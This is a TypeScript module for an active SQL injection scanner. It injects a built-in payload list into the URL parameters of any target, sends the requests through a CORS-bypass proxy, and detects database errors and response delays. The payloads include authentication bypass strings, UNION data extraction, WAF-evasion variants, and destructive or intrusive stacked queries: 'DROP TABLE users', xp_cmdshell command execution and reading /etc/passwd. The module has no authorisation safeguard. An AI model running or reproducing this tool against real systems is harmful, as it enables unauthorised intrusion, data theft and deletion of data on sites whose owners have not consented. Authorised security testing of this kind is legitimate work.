import { normalizeUrl } from './apiUtils';
import { fetchWithBypass, CORSBypassMetadata } from './corsProxy';
import { RequestManager } from './requestManager'; // Import RequestManager

export interface SQLScanResult {
  vulnerable: boolean;
  testedPayloads: number;
  vulnerabilities: Array<{
    payload: string;
    indicator: string;
    severity: 'critical' | 'high' | 'medium' | 'low' | 'catastrophic'; // Added 'critical' and 'catastrophic'
    type: string;
    evidence?: string;
    parameter?: string;
    confidence: number;
  }>;
  tested: boolean;
  method: string;
  corsMetadata?: CORSBypassMetadata;
}

const SQL_ERROR_PATTERNS = [
  // MySQL
  /you have an error in your sql syntax/i,
  /warning.*mysql/i,
  /valid mysql result/i,
  /mysqlclient\./i,
  /mysql_fetch/i,
  /mysql_num_rows/i,
  /mysqli/i,
  /mysql_connect/i, // Added
  /mysql_query/i, // Added
  
  // PostgreSQL
  /postgresql.*error/i,
  /pg_query/i,
  /pg_exec/i,
  /unterminated quoted string/i,
  /syntax error at or near/i, // Added
  /pg_connect/i, // Added
  
  // MSSQL
  /microsoft sql server/i,
  /odbc sql server driver/i,
  /sqlserver jdbc driver/i,
  /microsoft ole db provider for sql server/i,
  /unclosed quotation mark after the character string/i, // Added
  /incorrect syntax near/i, // Added
  
  // Oracle
  /ora-\d{5}/i,
  /oracle error/i,
  /quoted string not properly terminated/i,
  /missing expression/i, // Added
  
  // SQLite
  /sqlite.*error/i,
  /sqlite3::/i,
  /unrecognized token/i,
  /syntax error near/i, // Added
  
  // Generic
  /sql syntax.*error/i,
  /syntax error.*sql/i,
  /unclosed quotation mark/i,
  /quoted identifier/i,
  /database error/i, // Added
  /query failed/i, // Added
];

type Severity = 'critical' | 'high' | 'medium' | 'low' | 'catastrophic';

interface SQLPayload {
  payload: string;
  type: string;
  severity: Severity;
  confidence: number;
}

const SQL_PAYLOADS: SQLPayload[] = [
  // --- High Confidence Error/Syntax Breakers ---
  { payload: `\'`, type: 'Error-based', severity: 'high', confidence: 0.9 },
  { payload: `\"`, type: 'Error-based', severity: 'high', confidence: 0.9 },
  { payload: `')`, type: 'Error-based (Parenthesis)', severity: 'high', confidence: 0.85 },
  { payload: `"))`, type: 'Error-based (Double Parenthesis)', severity: 'high', confidence: 0.85 },

  // --- Boolean-based (Critical for Auth Bypass) ---
  { payload: `' OR '1'='1`, type: 'Boolean-based', severity: 'critical', confidence: 0.95 },
  { payload: `" OR "1"="1`, type: 'Boolean-based', severity: 'critical', confidence: 0.95 },
  { payload: `admin' --`, type: 'Comment-based', severity: 'high', confidence: 0.85 },
  { payload: `admin' #`, type: 'Comment-based (MySQL)', severity: 'high', confidence: 0.85 },
  { payload: `' OR 2>1--`, type: 'Boolean-based', severity: 'critical', confidence: 0.95 },

  // --- Union-based (Data Exfiltration) ---
  { payload: `' UNION SELECT NULL--`, type: 'Union-based', severity: 'critical', confidence: 0.9 },
  { payload: `' UNION SELECT 1,2,3--`, type: 'Union-based', severity: 'critical', confidence: 0.9 },
  { payload: `-1' UNION SELECT @@version, user(), database()--`, type: 'Union-based (Info Leak)', severity: 'critical', confidence: 0.95 },

  // --- Time-based Blind (Database Specific) ---
  { payload: `' AND SLEEP(5)--`, type: 'Time-based Blind (MySQL)', severity: 'critical', confidence: 0.98 }, // Increased confidence
  { payload: `1' WAITFOR DELAY '0:0:5'--`, type: 'Time-based Blind (SQL Server)', severity: 'critical', confidence: 0.98 }, // Increased confidence
  { payload: `1; SELECT PG_SLEEP(5)--`, type: 'Time-based Blind (PostgreSQL)', severity: 'critical', confidence: 0.98 }, // Increased confidence
  { payload: `1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('HT'),5)--`, type: 'Time-based Blind (Oracle)', severity: 'critical', confidence: 0.98 }, // Increased confidence

  // --- Advanced & Dangerous Payloads (Stacked Queries, OOB, File Read) ---
  { payload: `1; EXEC xp_cmdshell('whoami')--`, type: 'Stacked Query (SQL Server)', severity: 'catastrophic', confidence: 1.0 },
  { payload: `1; DROP TABLE users--`, type: 'Stacked Query (Data Loss)', severity: 'catastrophic', confidence: 1.0 },
  { payload: `1' AND (SELECT LOAD_FILE('/etc/passwd'))--`, type: 'File Read (MySQL)', severity: 'critical', confidence: 0.95 },

  // --- WAF Bypass / Obfuscation Attempts ---
  { payload: `' OR /*!500001=1*/--`, type: 'WAF Bypass (MySQL Inline Comment)', severity: 'high', confidence: 0.8 },
  { payload: `' OR '1'='1' /**/`, type: 'WAF Bypass (Multi-line Comment)', severity: 'high', confidence: 0.8 },
  { payload: `1' AND '1'='1' AND 'a'='a`, type: 'WAF Bypass (Keyword Split)', severity: 'high', confidence: 0.75 },
];


const testTimeBased = async (url: string, requestManager: RequestManager): Promise<{ vulnerable: boolean; duration: number }> => {
  const startTime = Date.now();
  
  try {
    await requestManager.fetch(url, { timeout: 8000 }); // Use requestManager
    
    const duration = Date.now() - startTime;
    
    // If response took 4.5+ seconds, likely vulnerable (for a 5-second sleep payload)
    return { vulnerable: duration >= 4500, duration };
  } catch (error: any) {
    if (error.name === 'AbortError') {
      // If aborted due to timeout, it means the delay likely occurred
      return { vulnerable: true, duration: 8000 };
    }
    return { vulnerable: false, duration: Date.now() - startTime };
  }
};

const checkSQLError = (text: string): { found: boolean; pattern?: string; confidence: number } => {
  const lowerText = text.toLowerCase();
  
  for (const pattern of SQL_ERROR_PATTERNS) {
    const match = text.match(pattern);
    if (match) {
      return {
        found: true,
        pattern: match[0],
        confidence: 0.95, // High confidence for error messages
      };
    }
  }
  
  return { found: false, confidence: 0 };
};

export const performSQLScan = async (target: string, requestManager: RequestManager, payloadLimit: number = 20): Promise<SQLScanResult> => {
  console.log(`[SQL Scan] Starting REAL vulnerability scan for ${target} with ${payloadLimit} payloads`);
  
  const result: SQLScanResult = {
    vulnerable: false,
    testedPayloads: 0,
    vulnerabilities: [],
    tested: true,
    method: 'Real Payload Testing with Error Pattern Matching',
  };

  try {
    const url = normalizeUrl(target);
    const urlObj = new URL(url);
    
    const params = new URLSearchParams(urlObj.search);
    const paramKeys = Array.from(params.keys());
    
    if (paramKeys.length === 0) {
      console.log('[SQL Scan] No parameters found, testing with default parameter');
      paramKeys.push('id');
      urlObj.search = '?id=1'; // Add a default parameter for testing
    }

    // Get baseline
    let baselineResponse: Response | null = null;
    let baselineText = '';
    let baselineStatus = 0;
    let baselineLength = 0;
    
    try {
      const baselineResult = await fetchWithBypass(url, { timeout: 10000, signal: requestManager.scanController?.signal });
      result.corsMetadata = baselineResult.metadata;
      baselineResponse = baselineResult.response;
      baselineText = await baselineResponse.text();
      baselineStatus = baselineResponse.status;
      baselineLength = baselineText.length;
      console.log(`[SQL Scan] Baseline: ${baselineStatus}, ${baselineLength} bytes`);
    } catch (error) {
      console.warn('[SQL Scan] Could not get baseline, continuing anyway');
    }

    const payloadsToTest = SQL_PAYLOADS.slice(0, payloadLimit);

    for (const paramKey of paramKeys) {
      for (const { payload, severity, type, confidence: baseConfidence } of payloadsToTest) {
        if (requestManager.scanController?.signal.aborted) {
          throw new Error('Scan aborted');
        }

        try {
          const testUrl = new URL(url);
          const testParams = new URLSearchParams(testUrl.search);
          const originalValue = testParams.get(paramKey) || '1';
          
          testParams.set(paramKey, originalValue + payload);
          testUrl.search = testParams.toString();

          console.log(`[SQL Scan] Testing ${type} on '${paramKey}': ${payload.substring(0, 30)}...`);

          // Time-based testing
          if (type.includes('Time-based Blind')) { // Check for time-based payloads
            const { vulnerable, duration } = await testTimeBased(testUrl.toString(), requestManager);
            
            if (vulnerable) {
              console.log(`[SQL Scan] ⚠️ CRITICAL: Time-based SQL injection confirmed (${duration}ms delay)`);
              result.vulnerable = true;
              result.vulnerabilities.push({
                payload,
                indicator: `Response delayed by ${duration}ms`,
                severity: 'critical',
                type,
                evidence: `Server response time: ${duration}ms (expected: ~5000ms)`,
                parameter: paramKey,
                confidence: 0.98,
              });
            }
            
            result.testedPayloads++;
            await new Promise(resolve => setTimeout(resolve, 500)); // Small delay after time-based test
            continue;
          }

          // Error-based and other testing
          const testResult = await fetchWithBypass(testUrl.toString(), { timeout: 10000, signal: requestManager.scanController?.signal });
          const response = testResult.response;
          result.testedPayloads++;

          const text = await response.text();
          const errorCheck = checkSQLError(text);

          // Check for SQL errors
          if (errorCheck.found) {
            console.log(`[SQL Scan] ⚠️ ${severity.toUpperCase()}: SQL error detected - ${errorCheck.pattern}`);
            result.vulnerable = true;
            
            const evidenceStart = text.toLowerCase().indexOf(errorCheck.pattern!.toLowerCase());
            const evidence = text.substring(Math.max(0, evidenceStart - 100), Math.min(text.length, evidenceStart + 200));
            
            result.vulnerabilities.push({
              payload,
              indicator: errorCheck.pattern!,
              severity,
              type,
              evidence: evidence.substring(0, 300) + '...',
              parameter: paramKey,
              confidence: errorCheck.confidence,
            });
          }

          // Check for status code changes (e.g., 500 Internal Server Error)
          if (baselineStatus > 0 && response.status !== baselineStatus && response.status >= 500) {
            console.log(`[SQL Scan] ⚠️ Server error detected (${response.status})`);
            result.vulnerable = true;
            result.vulnerabilities.push({
              payload,
              indicator: `HTTP ${response.status} error`,
              severity: 'high',
              type,
              evidence: `Server returned ${response.status} (baseline: ${baselineStatus})`,
              parameter: paramKey,
              confidence: 0.7,
            });
          }

          // Check for significant content changes (Union-based)
          // This is a weaker indicator, so confidence is lower unless combined with other factors.
          if (baselineText && type.includes('Union-based')) {
            const sizeDiff = Math.abs(text.length - baselineLength);
            const percentDiff = (sizeDiff / baselineLength) * 100;
            
            if (percentDiff > 20) { // A 20% change is a reasonable threshold
              console.log(`[SQL Scan] ⚠️ Significant content change: ${percentDiff.toFixed(1)}%`);
              // Only add if not already detected by error patterns for this payload
              if (!result.vulnerabilities.some(v => v.parameter === paramKey && v.payload === payload && v.type === type)) {
                result.vulnerable = true;
                result.vulnerabilities.push({
                  payload,
                  indicator: 'Content length changed significantly',
                  severity: 'medium', // Reduced severity for this indicator alone
                  type,
                  evidence: `Response size: ${text.length} bytes (baseline: ${baselineLength}, diff: ${percentDiff.toFixed(1)}%)`,
                  parameter: paramKey,
                  confidence: 0.6, // Lower confidence
                });
              }
            }
          }

          await new Promise(resolve => setTimeout(resolve, 300));
        } catch (error: any) {
          if (error.message === 'Scan aborted') {
            throw error; // Re-throw if scan was aborted
          }
          console.warn(`[SQL Scan] Payload test failed for ${paramKey} with ${payload.substring(0, 20)}...: ${error.message}`);
        }
      }
    }

    // Filter out low confidence results
    result.vulnerabilities = result.vulnerabilities.filter(v => v.confidence >= 0.7);

    console.log(`[SQL Scan] Complete: ${result.vulnerabilities.length} high-confidence vulnerabilities from ${result.testedPayloads} tests`);
    return result;
  } catch (error: any) {
    if (error.message === 'Scan aborted') {
      throw error;
    }
    console.error('[SQL Scan] Critical error:', error);
    return {
      vulnerable: false,
      testedPayloads: 0,
      vulnerabilities: [],
      tested: false,
      method: 'Failed',
    };
  }
};